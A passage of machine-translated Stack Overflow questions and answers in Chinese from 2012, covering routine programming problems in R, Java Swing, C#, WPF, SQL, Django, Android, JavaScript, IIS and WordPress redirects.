    vec <- laply(str_split(vec, ':'), function(x) as.integer(x[1]) * 3600 + as.integer(x[2]) * 60 + as.integer(x[3]))
  }

  return (vec)
} 
```

* * *

根据上面卡尔的评论，使用`lubridate`：

```
library(lubridate)
hms(y)

[1] 10 seconds                         10 minutes and 10 seconds          2 hours, 10 minutes and 2 seconds 
```

为了更好的衡量：

```
> str(hms(y))
Formal class 'Period' [package "lubridate"] with 6 slots
  ..@ .Data : num [1:3] 10 10 2
  ..@ year  : num [1:3] 0 0 0
  ..@ month : num [1:3] 0 0 0
  ..@ day   : num [1:3] 0 0 0
  ..@ hour  : num [1:3] 0 0 2
  ..@ minute: num [1:3] 0 10 10
> 
```

`period`Hadley 创建的类型使用`lubridate`起来非常愉快，但确实需要一点时间来适应。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-08-14T18:03:40.667

我参加聚会有点晚了，但我认为这是一个很好的方法，因为它使用标准时间函数并且非常简单：

```
as.integer(as.POSIXct(y,format="%H:%M:%S",tz="GMT")) %% (60*60*24) 
```

`[1] 10 610 7802`

注意：这仅适用于您的数据是时钟时间的情况。

# jquery - Omniture：动态更改页面名称

> ID：11955168
> 
> 赞同：1
> 
> 时间：2012-08-14T14:59:17.830
> 
> 标签：jquery, event-handling, jquery-tabs, adobe-analytics

是否可以将选项卡视为新页面（从 Omniture 的角度来看）并在用户单击不同的（jQuery）选项卡时更改页面标题？本质上，更改`s.pageName`用户在选项卡之间导航的时间。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-06T06:03:04.623

使用点击事件来做到这一点：

```
$("#tab1,#tab2,#tab3").on("click", pageToggle);

function pageToggle(event)
  {
  s.pageName = event.target.id;
  } 
```

# java - 使用 JOptionPane 时 JTable 布尔值不更新

> ID：11955169
> 
> 赞同：1
> 
> 时间：2012-08-14T14:59:22.517
> 
> 标签：java, swing, jtable, joptionpane

我正在尝试编写一些代码，允许用户通过单击`JTable`.

![图片](../Images/69a9ed5cab4bc5b8c131926f51dd4471.png)

我可以让程序将表中的数据输入到文本字段中，但我目前的执行方法涉及一个 JOptionPane，它出于某种奇怪的原因阻止表更改复选框值（即复选框没有t 从黑色变为勾选）。不仅如此，选择不会更新，因此最后一列中的值保持为假，即使选择应将其切换为真。

我认为这可能与以`JOptionPane`某种方式覆盖选择事件有关，但我对对象的了解不够多，`JOptionPane`无法说明如何。我的代码是：

```
table.setSelectionMode(ListSelectionModel.MULTIPLE_INTERVAL_SELECTION);
ListSelectionModel selectionModel = table.getSelectionModel();
selectionModel.addListSelectionListener(new ListSelectionListener() {

    public void valueChanged(ListSelectionEvent e) {
        ListSelectionModel lsm = (ListSelectionModel) e.getSource();
        if (lsm.isSelectionEmpty()) {
            //no rows are selected do nothing
        } else {
            //First find the row clicked
            int selectedRow = lsm.getLeadSelectionIndex();
            /*
                * put a popup here to ask the user which peak to associate
                * the energy with.
                */
            System.out.println(selectedRow);
            //Get user to associate with a peak
            availablePeaks = getAvailablePeaks();
            String returnVal = (String) JOptionPane.showInputDialog(
                null,
                "Select the peak:",
                "Peak Matching",
                JOptionPane.QUESTION_MESSAGE,
                null,
                availablePeaks, null);
            System.out.println(returnVal);
            //Determine the selection
            int index = 0;
            for (int i = 0; i < availablePeaks.length; i++) {
                if (availablePeaks[i] == returnVal) {
                    index = i;
                } else {
                }
            }
            //Set the peak value in the peak specifier to the energy in the row
            double energy = (Double) table.getValueAt(selectedRow, 0);
            System.out.println(energy);
            frame.getPeakSetter().getPeakSpecifiers()[index].setEnergy(energy);
            frame.getPeakSetter().getPeakSpecifiers()[index].getTextField().setText("" + energy);
        }
    }
}); 
```

有谁知道为什么 a`JOptionPane`会`ListSelectionListener`阻止表格更新复选框？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-14T17:03:31.577

我假设您的模型返回并`true`返回该`isCellEditable()`列。[这将启用此处](http://docs.oracle.com/javase/tutorial/uiswing/components/table.html#editrender)列出的默认 rednerer/editor 。`getColumnClass()``Boolean.class``JCheckBox`

看起来选择行的手势正在弹出对话框。目前尚不清楚这如何阻止`DefaultCellEditor`得出结论；这个对我有用。由于您没有检查`getValueIsAdjusting()`，我很惊讶您没有看到两个`ListSelectionEvent`实例。

无论如何，每次选择更改时都弹出一个对话框似乎很麻烦。有几种可能的选择：

*   保留，通过from`ListSelectionListener`返回使单元格不可编辑，并仅在对话框成功结束时在模型中设置其值。`false``isCellEditable()`

*   放弃`ListSelectionListener`支持`JButton`编辑器，[此处](https://stackoverflow.com/a/3591230/230513)显示。

*   放弃`ListSelectionListener`支持 custom `CellEditor`，如下所述。

    ```
    table.setDefaultEditor(Boolean.class, new DefaultCellEditor(new JCheckBox()) {

        @Override
        public boolean stopCellEditing() {
            String value = JOptionPane.showInputDialog(...);
            ...
            return super.stopCellEditing();
        }
    }); 
    ```

# c# - 在 C# 中使用 Excel 互操作获取范围的 NumberFormat

> ID：11955170
> 
> 赞同：1
> 
> 时间：2012-08-14T14:59:26.673
> 
> 标签：c#, excel

我正在尝试使用 Microsoft.Office.Interop.Excel 在 c# 中读取 excel 文件。我想读取单元格范围，因为它比逐个读取单元格要快得多：

```
Range rbeg = (Range)sheet.Cells[1, i + 1];
Range rend = (Range)sheet.Cells[totalRowCount, i + 1];
Range range = sheet.get_Range(rbeg, rend);
column = (object[,])range.Value2; 
```

问题是当我想通过调用来获取单元格的数字格式时：

```
range.NumberFormat 
```

我得到 System.DBNull。当我将其称为单细胞时，它可以工作。

我想区分具有数值和“％”值的单元格。

有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-14T15:01:16.440

请参阅[文档](http://msdn.microsoft.com/en-us/library/office/bb213677.aspx)：

> 如果指定范围内的所有单元格的数字格式不同，[NumberFormat] 返回 Null。

在这种情况下，您希望它做什么？

# c# - 如何为 DataGrid 中的 DataGridTemplateColumn 创建可重用的 CellTemplate？（仅限 XAML）

> ID：11955172
> 
> 赞同：5
> 
> 时间：2012-08-14T14:59:27.190
> 
> 标签：c#, wpf, xaml, wpfdatagrid

我一直在寻找我希望这个问题的一个非常简单的解决方案，但是虽然我在 stackoverflow 上发现了很多其他问题，这些问题似乎提出了类似的问题，并提供了一些建议的答案，但我已经通过它们全部，答案要么不起作用，要么实际上并没有回答问题。

我有一个带有几列的 WPF DataGrid，我已将其设置为 DataGridTemplateColumns，如下所示：

```
<DataGridTemplateColumn Header="Price 1" Width="60">
    <DataGridTemplateColumn.CellTemplate>
        <DataTemplate>
            <ContentPresenter Content="{Binding Price1}" ContentTemplate="{StaticResource NumericCellDataTemplate}" />
        </DataTemplate>
    </DataGridTemplateColumn.CellTemplate>
</DataGridTemplateColumn>

<DataGridTemplateColumn Header="Price 2" Width="60">
    <DataGridTemplateColumn.CellTemplate>
        <DataTemplate>
            <ContentPresenter Content="{Binding Price2}" ContentTemplate="{StaticResource NumericCellDataTemplate}" />
        </DataTemplate>
    </DataGridTemplateColumn.CellTemplate>
</DataGridTemplateColumn>

<DataGridTemplateColumn Header="Price 3" Width="60">
    <DataGridTemplateColumn.CellTemplate>
        <DataTemplate>
            <ContentPresenter Content="{Binding Price3}" ContentTemplate="{StaticResource NumericCellDataTemplate}" />
        </DataTemplate>
    </DataGridTemplateColumn.CellTemplate>
</DataGridTemplateColumn> 
```

我已经定义了一个名为“NumericCellDataTemplate”的可重复使用的 DataTemplate，它为每一列提供了一些共同的特性，包括数字格式、对齐和值变化的背景突出显示。请注意，这一切都源于我在 ViewModel 中定义的一些特殊属性：

```
<DataTemplate x:Key="NumericCellDataTemplate">
    <Border Name="cellBorder" BorderThickness="0" BorderBrush="Transparent">
        <Border.Style>
            <Style TargetType="{x:Type Border}">
                <Style.Setters>
                    <Setter Property="Background" Value="Transparent" />
                </Style.Setters>
                <Style.Triggers>
                    <DataTrigger Binding="{Binding IsRecentlyChanged}" Value="True">
                        <DataTrigger.EnterActions>
                            <BeginStoryboard Storyboard="{StaticResource IsRecentlyChangedEnterStoryboard}" />
                        </DataTrigger.EnterActions>
                        <DataTrigger.ExitActions>
                            <BeginStoryboard Storyboard="{StaticResource IsRecentlyChangedExitStoryboard}" />
                        </DataTrigger.ExitActions>
                    </DataTrigger>                                
                </Style.Triggers>
            </Style>
        </Border.Style>
        <TextBlock Text="{Binding Value, StringFormat='#,##0.00'}" HorizontalAlignment="Right" />
    </Border>
</DataTemplate> 
```

我已经为那些背景颜色动画设置了故事板，当值改变时触发。viewModel 正在跟踪这个并分别为每个值设置/取消设置我的 IsRecentlyChanged 属性：

```
<Storyboard x:Key="IsRecentlyChangedEnterStoryboard">
    <ColorAnimation Duration="0:0:0.3" To="LightSteelBlue" FillBehavior="HoldEnd" Storyboard.TargetProperty="(Background).(SolidColorBrush.Color)" />
</Storyboard>
<Storyboard x:Key="IsRecentlyChangedExitStoryboard">
    <ColorAnimation Duration="0:0:0.3" To="Transparent" FillBehavior="HoldEnd" Storyboard.TargetProperty="(Background).(SolidColorBrush.Color)" />
</Storyboard> 
```

这里的一切似乎都运行良好。请注意，我使用自定义 DataGridTemplateColumn 而不仅仅是简单的 DataGridTextColumn 的原因之一是我绑定到的属性（例如 Price1）是一个复杂对象，而不仅仅是要显示的简单值类型或字符串. 它实际上是一个 IPropertyModel，它是我定义的一个接口，其中包含一些有用的属性供视图层绑定到：

```
public interface IPropertyModel : INotifyPropertyChanged
{
    string Name { get; }
    bool IsRecentlyChanged { get; }
}

public interface IPropertyModel<T> : IPropertyModel
{
    T Value { get; set; }
} 
```

所以我想做的就是找到一种方法来将我上面提到的那些 DataGridTemplateColumns 的定义简化为一个简单的单行内容，如下所示：

```
<DataGridTemplateColumn Header="Price1" Width="60" Binding="{Binding Price1}" ContentTemplate="{StaticResource NumericCellDataTemplate}" /> 
```

当然，这里的问题是 DataGridTemplateColumn 没有 DataGridTextColumn 那样的 Binding 属性。我已经尝试了许多建议，例如在 DataGridCell 上使用 Style 以使用新的 ControlTemplate 完全覆盖其模板，并提供自定义 ContentPresenter。我还尝试使用 DataGridTextColumn 执行此操作，以利用它已经具有我们可以使用的 Binding 属性这一事实 - 但我看不到如何从 Style 或 ContentPresenter 中访问它。

一些建议谈到使用 RelativeAncestor 或 TemplateBinding 返回 DataGridTemplateColumn，然后从中读取附加属性，例如 ap:MyAttachedProperties.Binding - 但正如一些人所指出的，一旦您在 DataGridCell 模板中，您不再可以访问原始的 DataGridTemplateColumn，因为我猜它不在 Visual/Logical 树中？因此，经过大量实验，也没有证明有帮助。

任何其他建议将不胜感激。如果有人有更好的主意，我很乐意使用 DataGridTextColumn、DataGridTemplateColumn 或其他东西。在此示例中，我只有 3 列，以及所有这些列的一个可重复使用的 DataTemplate。但是想象一个更复杂的场景，我们有 20 多列，可能绑定到几个不同的可重用 DataTemplate 中的一个来执行不同类型的格式化和显示逻辑 - 所以如果每一列都需要 7 多行 XAML 代码，这将变得一团糟.

谢谢！

# iphone - 如何在 UITableViewCell 中封装 Picker？

> ID：11955173
> 
> 赞同：0
> 
> 时间：2012-08-14T14:59:27.993
> 
> 标签：iphone, datepicker

任何人都可以提供有关“如何制作仅覆盖一半屏幕的模态日期选择器”这个问题的答案的更多详细信息？由用户 eladleb 回答。

```
@interface pickerCell : UITableViewCell
{
    UITextField *txtTextField;
    UIPickerView* dtpPicker;
} 
```

特别是步骤2、3、4，任何人都可以详细说明（即哪种方法......）？示例代码受到高度赞赏。谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-14T16:05:51.073

iOS 有一个 UIActionSheet，专为这样的用途而设计。

[http://developer.apple.com/library/ios/#DOCUMENTATION/UIKit/Reference/UIActionSheet_Class/Reference/Reference.html](http://developer.apple.com/library/ios/#DOCUMENTATION/UIKit/Reference/UIActionSheet_Class/Reference/Reference.html)

还有一个开源框架可以将选择器放入操作表中进行大量工作。这样，当用户点击单元格时，会显示操作表。

[https://github.com/TimCinel/ActionSheetPicker](https://github.com/TimCinel/ActionSheetPicker)

# sql - SQL 日期时间数学

> ID：11955178
> 
> 赞同：3
> 
> 时间：2012-08-14T14:59:39.593
> 
> 标签：sql, sql-server

我正在尝试执行以下操作：

*   格式化`GetDate()`为只显示分钟
*   格式化一`varchar`列以仅显示分钟
*   `HH:MM:SS`从`GetDate()`和`VarChar`列中减去当前时间

这就是我所拥有的

```
CONVERT(VARCHAR(5), GETDATE(), 108) - substring(convert(varchar(20), ColumnName, 9), 13, 5) 
```

但我收到此错误，需要一些帮助：

> *操作数数据类型 varchar 对减法运算符无效。*

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-14T15:05:45.680

你想要的是日期部分（mi）。

要获取 getdate() 的分钟数：

```
select datepart(mi, getdate()) 
```

从日期时间中减去分钟数：

```
select dateadd(mi, - <minutes>, <datevalue>) 
```

要从 getdate() 中删除时间，只需转换为日期（在 SQL Server 的更新版本中）：

```
select cast(getdate() as date) 
```

要以分钟为单位获得差异，请使用 datediff：

```
select datediff(mi, <datestart>, <dateend>) 
```

你真正想要完成什么？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-14T15:21:40.823

我认为这就是你想要的：

```
declare @str varchar(30)
set @str = '2012-08-14 10:12:02.690'

select datediff(minute, cast(@str as datetime), getdate()) 
```

结果`getdate() = '2012-08-14 11:21:10.250'`是总分钟数甚至超过 60 分钟：

```
69 
```

# asp.net - 以编程方式在 web.config 中为部署在网络场中的应用程序添加密钥

> ID：11955179
> 
> 赞同：1
> 
> 时间：2012-08-14T14:59:43.900
> 
> 标签：asp.net, .net, web-farm

如何使 config.AppSettings.Add(key,value) 以编程方式在网络场中的所有框上添加新密钥？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-14T16:44:40.930

下面是一些添加或更新密钥的代码：

```
Dim cfg As System.Configuration.Configuration = System.Configuration.ConfigurationManager.OpenExeConfiguration(Configuration.ConfigurationUserLevel.None)

cfg.AppSettings.Settings.Remove(key) //Get rid of the existing value
cfg.AppSettings.Settings.Add(key, val)

cfg.Save(Configuration.ConfigurationSaveMode.Modified) 
```

# titanium - Titanium Mapview 单击获取经度和经度

> ID：11955186
> 
> 赞同：1
> 
> 时间：2012-08-14T14:59:55.060
> 
> 标签：titanium, android-mapview, appcelerator

我希望在 Titanium（appcelerator）中创建一个简单的地图视图，但我想要/需要做的是让用户单击或长按地图并从地图上的该选择中获取纬度和经度。地图视图确实有一个`mapview.addEventListener('click',function(evt))`，但是单击时我没有得到这些值。对此的任何帮助都会很棒！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-14T15:35:29.727

从点击或长按坐标计算纬度和经度非常容易（如果不是太缩小的话）。[在 Appcelerator Q&A](http://developer.appcelerator.com/question/132508/how-to-add-annotation-on-mapview-click-event)中从这个问题中获取的事件侦听器中使用此函数：

```
var calculateLatLngfromPixels = function(mapview, xPixels, yPixels) {

    var region = mapview.actualRegion || mapview.region;
    var widthInPixels = mapview.rect.width;
    var heightInPixels = mapview.rect.height;

    // should invert because of the pixel reference frame
    heightDegPerPixel = -region.latitudeDelta / heightInPixels; 
    widthDegPerPixel = region.longitudeDelta / widthInPixels;

    return {
        lat : (yPixels - heightInPixels / 2) * heightDegPerPixel + region.latitude,
        lon : (xPixels - widthInPixels / 2) * widthDegPerPixel + region.longitude

    };
} 
```

请注意，您无法`longpress`在 MapView 本身上侦听事件，因此将其嵌套在常规容器视图中并将侦听器添加到其中。像这样的用法示例：

```
var container = Ti.UI.createView({
    top : 0,
    left : 0
});
container.add(mapview);

container.addEventListener('longpress', function(e) {
    var coordinate = calculateLatLngfromPixels(mapview, e.x, e.y);
    var longitude = coordinate.lat;
    var latitude = coordinate.lat;
}); 
```

如果您查看地球的一个（相对）小区域，当您完全缩小时，这将起作用，如果您想完全放大，由于地球的曲率，您将不得不使用墨卡托投影来获得真实坐标然后使用该模块。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-14T15:14:07.313

市场上有一个模块。购买价格为 0.99 美元，并会为您提供地图坐标[https://marketplace.appcelerator.com/apps/1334](https://marketplace.appcelerator.com/apps/1334)

# django - Django 多个 Many2Many 关系

> ID：11955189
> 
> 赞同：0
> 
> 时间：2012-08-14T14:59:58.953
> 
> 标签：django, many-to-many

我创建了一个模型，我在其中定义了一个地方，它有几个属性 (M2M)，每个属性都有几个选择。用户可以为一个或多个选项投票，因此我定义了从选项到用户的 M2M 关系。但是我没有实现所需的功能，因为用户只连接到选择而不是连接到具有选择的特定位置。我的模型如下：

```
class Place(models.Model):
    StoreName=models.CharField(max_length=200)
    Pic=models.ImageField(upload_to="media",blank=True,null=True)
    Address=models.CharField(max_length=200)

    def __unicode__(self):
        return self.StoreName   

class TypeProperty(models.Model):
    Place = models.ManyToManyField(Place)
    TypePropertyName=models.CharField(max_length=42)
    def __unicode__(self):
        return self.TypePropertyName

class TypeChoices(models.Model):
    TypeProperty = models.ForeignKey(TypeProperty)
    TypeChoiceName=models.CharField(max_length=42)
    UserVoted=models.ManyToManyField(User,blank=True,null=True) 
```

我怎样才能实现功能

*用户已为特定**地点****的****选项**投票*

 ***** * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-14T15:20:09.217

从`User`你可以得到`TypeChoices`：

```
user_instance.typechoices_set.all() 
```

然后，您可以遍历每个`TypeChoice`并`Place`通过`TypeProperty`属性访问查询集：

```
typechoice_instance.TypeProperty.Place.all() 
```

然后你需要遍历每个`Place`来做任何事情。

现在，看着它，应该立即看出这里存在一些严重的缺陷。代码没有意义，而且不可读。这就是存在编码约定的原因。请仔细阅读[Python 样式指南 (PEP8)](http://www.python.org/dev/peps/pep-0008/)。

特别是对于您的代码，类上的属性应该全部小写，并且属性名称中的单词应该用下划线分隔，即`store_name`NOT `StoreName`。

然后，属性名称应该与它们所代表的内容平行：`Place`对于将返回多个位置的字段没有意义。命名它`places`以表明它返回多个项目（特别是返回查询集而不是模型实例）。

**更新**

如果需要，则需要向后工作并选择`TypeChoices`：

```
TypeChoices.objects.filter(UserVoted=some_user, TypeProperty__Place=some_place) 
```****

# android - Gingerbread 下 ActionBarSherlock 的 SherlockDialogFragment 样式

> ID：11955192
> 
> 赞同：3
> 
> 时间：2012-08-14T15:00:11.013
> 
> 标签：android, actionbarsherlock

我正在使用 ActionBarSherlock 和 SherlockDialogFragment。在 ICS 下运行应用程序时，对话框显示得很好。但是，当在 Gingerbread 下运行时，对话框没有应用样式：

我不确定这是否是它的工作方式，或者我是否遗漏了一些东西。ActionBarSherlock 仅提及将活动设置为看起来像对话框。示例代码没有 DialogFragments 的示例。我的问题是：“SherlockDialogFragment 是否应该看起来像 Gingerbread 下的正确对话？”

我无法发布图片，因为我没有任何声望点。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T15:24:00.110

1.  A `DialogFragment`（以及扩展 a `SherlockDialogFragment`）不是 UI 对象，因此可以没有样式。您指的是`Dialog`由片段管理的常规。
2.  ActionBarSherlock 不`Dialog`设置元素样式，因为它们不是操作栏的一部分。如果您希望显示的对话框具有一致的外观，您需要自己这样做。

# php - jQuery插件合并两张图片并保存结果一张？

> ID：11955194
> 
> 赞同：-2
> 
> 时间：2012-08-14T15:00:19.070
> 
> 标签：php, jquery, image, merge

我正在做一些需要以下内容的事情：

*   有一个带有特定页眉和页脚的图像，用作一种模板/背景
*   用户需要能够上传图像、裁剪图像并将其拖到模板上，并在理想情况下定位它
*   新图像被保存

你们中是否有人碰巧知道一两个可以实现此功能的插件？我有一些使用 jCrop 的东西，但是我自己完成了图像合并的东西，它不是很好。我更喜欢更强大的东西，所以最好有一个独立的插件。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-14T15:11:07.890

您可以使用 HTML5 Canvases 实现类似的效果，但它并不优雅，而且显然不适用于每个浏览器。

这个想法是简单地将这些图像绘制到画布上，然后将`img`对象设置为画布的源

> 要将画布绘制保存为图像，我们可以将图像对象的来源设置为图像数据 URL。从那里，用户可以右键单击图像以将其保存到本地计算机。或者，您也可以直接打开一个带有图像数据 url 的新浏览器窗口，用户可以从那里保存它。

```
// save canvas image as data url (png format by default)
var dataURL = canvas.toDataURL();

// set canvasImg image src to dataURL
// so it can be saved as an image
document.getElementById("canvasImg").src = dataURL; 
```

[在此处](http://www.html5canvastutorials.com/advanced/html5-canvas-save-drawing-as-an-image/)查看完整教程

# iis - Web.config 映射路径到静态文件

> ID：11955200
> 
> 赞同：2
> 
> 时间：2012-08-14T15:00:25.957
> 
> 标签：iis, web-config

我使用 IIS 仅提供静态文件。我想将路径 /foo 映射到 bar.html （或任何其他文件）。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T15:18:52.080

*   如果您使用的是 IIS 6，则有[**URL Rewriter**](http://urlrewriter.net/)。
*   对于 IIS 7 及更高版本，有来自 Microsoft的[官方**IIS URL Rewrite** 2.0 模块。](http://www.iis.net/download/urlrewrite)

还有许多其他用于 IIS 的 URL 重写模块，以上是免费的，我已经在我的项目中成功使用了它们。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-14T15:03:19.910

您正在查看做一些 URL 重写检查这篇文章：

[http://msdn.microsoft.com/en-us/library/ms972974.aspx](http://msdn.microsoft.com/en-us/library/ms972974.aspx)

如果您的映射需求很简单，我会推出自己的 HttpHandler：

[http://msdn.microsoft.com/en-us/library/ms228090.aspx](http://msdn.microsoft.com/en-us/library/ms228090.aspx)

但由于您提供静态文件并且不需要任何自定义代码，您可以尝试使用出站规则：

[http://learn.iis.net/page.aspx/657/creating-outbound-rules-for-url-rewrite-module/](http://learn.iis.net/page.aspx/657/creating-outbound-rules-for-url-rewrite-module/)

# javascript - 表单“提交”在 IE 中工作，但不适用于 FF 和 Chrome

> ID：11955205
> 
> 赞同：1
> 
> 时间：2012-08-14T15:00:37.803
> 
> 标签：javascript, javascript-events

我的网站上有一个注册表单，它在 IE 中运行良好，但在 FF 或 Chrome 中无法运行。我曾尝试在这里查看其他有类似问题的论坛帖子，但仍然无法解决这个愚蠢的问题。（我不是代码编写者）。

这是代码

引用

```
<script type="text/JavaScript">
function validate_form(){
{validation_text}
else{
        return true;
    }
}
var str_vars = '';
function all_fields(){
    str_vars = '';
    el = document.form1;
    for (var i = 0; i < el.elements.length; i++) {
        if (el.elements[i].value != '')
        str_vars += el.elements[i].name+'='+el.elements[i].value+'&';
    }
    str_vars = str_vars.substr(0,str_vars.length-15);;
}
</script>
<div id="div_form" name="div_form">
<form id="form1" name="formx" method="{send_method}" action="{form_switch}">
<p>&nbsp;</p>
<table border="0" width="100%" style="border-collapse: collapse" bordercolor="#111111" cellpadding="0" cellspacing="0">
{error}
{signup_list}
<tr>
    <td align="right">{description_country} &nbsp;</td>
    <td>{shiping_country_list}{required_country}</td>
  </tr>
<tr><td align="right"> {promo}</td></tr>
 {code_signup}
  <tr>
    <td colspan="2"><div align="center">
      <input name="terms" id="terms" value="1" type="checkbox">
      <label for="terms">I accept the <a href="terms.php" target="_blank">terms &amp; conditions</a></label>
    </div></td>
    </tr>
     <tr>
    <td colspan="2"><div align="center">
{captcha}</td>
    </tr>
    {arp_fields}
  <tr>
    <td><div align="right">*</div><br></td>
    <td width="332">Denotes required</td>
  </tr>
  <tr>
    <td>
      <div align="right">
 <input name="Submit" value="Submit" type="button" onclick="{request}{request_email}{form2items}">
        </div></td>
    <td> <br></td>
  </tr>
</table>
</form> 
```

尾引号

任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T15:04:52.857

也许代替

```
el = document.form1; 
```

尝试

```
 el = document.getElementById('form1'); 
```

我看不到所有的 JS，所以很难猜，但要尝试的另一件事是将提交按钮的名称`name="Submit"`从`name="submitForm"`. 如果 form.submit() 在脚本的某个地方被调用，这可能会导致问题。

您的验证函数应如下所示：

```
function validate_form(){
var form = document.getElementById('form1');
err = 'The following fields are not correct filled:\n';

if (form.first_name.value == ''){
    err += 'No First Name.\n';
}

if (emailCheck(form.email.value) == false){
    err += 'No Valid email.\n';
}

if (form.terms.checked != true){                
    err += 'You did not agree with the terms.\n';
}

if (err != 'The following fields are not correct filled:\n'){
    alert (err);
    return false;
}

else{
        return true;
    }
} 
```

最后，将您的提交按钮更改为： `<input name="Submit" value="Submit" type="button" onclick="if (validate_form()) document.getElementById('form1').submit();">`

# wordpress - 重定向到新域并更改 url 结构 htaccess

> ID：11955206
> 
> 赞同：1
> 
> 时间：2012-08-14T15:00:42.220
> 
> 标签：wordpress, .htaccess, redirect

我正在尝试将 wordpress 博客从旧域重定向到新域并更改新域上 url 的结构。

所以我希望***www.domainA.com 重定向***到***test.domainB.com/folder/*** 和***www.domainA.com/2001/12/some-post***重定向到***test.domainB.com/folder/some-post***

这是我目前在我的 htaccess 文件中的内容。我已经设法实现了我的第二个目标，但是如果您访问***www.domainA.com***，它不会重定向到***test.domainB.com/folder/***除了主页之外，所有其他页面都正确重定向。

```
# BEGIN WordPress
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteCond %{HTTP_HOST} ^(www\.)?domainA\.com$ [NC]
RewriteRule ^([0-9]+)/([0-9]+)/(.*)$ http://test.domainB.com/folder/$3 [R=301,NC,L]

RewriteBase /
RewriteRule ^index\.php$ - [L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /index.php [L]
</IfModule>

# END WordPress 
```

我确定我错过了一些基本的东西，但我似乎无法弄清楚:(

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T15:29:09.197

试试这个代码：

```
RewriteEngine On

RewriteCond %{HTTP_HOST} ^(www\.)?domainA\.com$ [NC]
RewriteRule ^/?\d+/\d+/(.*)$ http://test.domainB.com/folder/$1 [NC,L,R=301]
RewriteCond %{HTTP_HOST} ^(www\.)?domainA\.com$ [NC]
RewriteRule ^/?$ http://test.domainB.com/folder/ [NC,L,R=301]

RewriteBase /
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^.*$ /index.php [L] 
```

# wordpress - Woocommerce+wpml 产品图片

> ID：11955211
> 
> 赞同：0
> 
> 时间：2012-08-14T15:00:52.553
> 
> 标签：wordpress, woocommerce

我正在使用 Woocommerce 和 WMPL 插件运行 WP。它非常适合翻译，除了一个细节：

当我使用 WPML 翻译管理插件将产品从英语（主要语言）翻译成法语时，一切正常，但我添加到英语版本的图像未显示在法语版本上。我错过了什么吗？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-20T09:40:40.150

我认为这可能是 WPML 中的一个错误，我们已经在待办事项列表中修复了该错误。本周我们应该有一个不错的 WooCommerce Multilingual 新版本。我将在我们的博客中写下它并邀请人们进行 beta 测试。

[http://wpml.org/blog/](http://wpml.org/blog/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-01-24T20:56:40.350

我想我也有类似的问题，我可以用 WPML 媒体翻译解决它

**设置 > 下拉到媒体翻译**

查看：

*   **以所有语言翻译现有媒体**

*   **为已翻译的内容复制现有媒体**

*   **为翻译的内容复制特色图像**

*   然后**开始**

# c# - 如何使用 VS 的自动选项设置/获取值

> ID：11955217
> 
> 赞同：3
> 
> 时间：2012-08-14T15:01:07.733
> 
> 标签：c#, visual-studio, setter, getter

今天我发现 VS 提供了一种自动定义`setters`和`getters`. 为了清楚起见，我有一个简单的课程`Students`：

```
 class Students
    {
        private string name;
        private Int32 pin;
        private string addres;
        private int phone;
     ... 
```

当我选择`name`并单击`ctrl`+ `k`，`x`然后选择`C#`然后`propg`我得到：

```
 class Students
    {
        private string public int MyProperty { get; private set; }
        private Int32 pin;
        private string addres;
        private int phone; 
```

这样的代码显然存在问题，所以我最终得到：

```
 class Students
    {
        private string name { get; private set; }
        private Int32 pin;
        private string addres;
        private int phone; 
```

我的问题是 - 这是利用 VS 自动化的正确方法`getters`吗`setters`？设置和获取 的值的正确语法是`name`什么？如果这段代码是正确的，是否有一种更优雅的方式来使用 VS 创建我的`getters`而`setters`不是我发现的那个？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-14T15:05:02.527

将光标放在私有变量声明上，然后按 `ctrl-R`,`ctrl-E`

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-14T15:04:16.063

不，这不对。您需要的是从字段*重构*为自动属性，而不是*新属性*。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-08-14T15:04:36.593

您可以键入“prop”，按两次 TAB，Visual Studio 将添加：

```
public TYPE Type { get; set; } 
```

然后你改变“类型”和“类型”

```
public string Name { get; set; } 
```

这是在 Visual Studio 中创建属性的最快快捷方式。

编辑：另外，正如 Serg 提到的，您可以转到`Refactor`->`Encapsulate Field`菜单选项将您的字段转换为属性。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-08-14T15:04:59.313

自动属性背后的想法是完全删除私有字段，并用自动属性（具有隐藏的支持字段）替换它们。

还有一个代码片段

```
prop (TAB TAB) 
```

也就是说，您应该考虑将 get / setter 公开，通常的约定是 PascalCase 属性名称，即。

```
class Students
{
    public string Name { get; set; }
    public Int32 Pin { get; set; }
    public string Address { get; set; }
    public int Phone { get; set; }
   ... 
```

**编辑** 根据 Servy 的评论，越来越多的趋势是使以数据为中心的类（如 DTO 的[不可变](http://msdn.microsoft.com/en-us/library/bb383979%28v=vs.90%29.aspx). 这将导致设置器私有化，并为类提供初始化构造函数和/或类工厂方法。但那是以后的事情:)

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-08-14T15:15:02.500

你得到的语法是正确的......如果你想要一个带有[自动支持字段](http://msdn.microsoft.com/en-us/library/bb384054.aspx)的私有 getter/setter 。

